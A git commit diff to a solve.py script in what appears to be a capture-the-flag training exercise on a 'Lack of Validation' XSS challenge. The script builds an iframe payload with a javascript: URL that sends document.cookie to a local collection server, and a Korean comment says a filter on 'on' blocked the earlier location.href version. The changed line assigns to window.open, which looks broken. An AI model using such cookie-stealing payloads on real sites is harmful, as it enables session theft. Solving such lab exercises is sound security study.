6e444f4efb439561f12e79504c198eadc152b480
chae0nion <160712029+chae0nion@users.noreply.github.com>
2025-03-31 20:43:46 +0900

    Update solve.py

--- week2/Lack_of_Validation1/solve/solve.py
+++ week2/Lack_of_Validation1/solve/solve.py
@@ -2,10 +2,10 @@ import requests
 
 payload = """
 <iframe src="javascript:
-        location.href = 'http://127.0.0.1:5000/?'%2bdocument.cookie;
+        window.open = 'http://127.0.0.1:5000/?'%2bdocument.cookie;
     ">
 """
-
+#on이 있으면 안돼서 저 location이 안됨...
 data = {
     "url":f"/?html={payload}"
 }
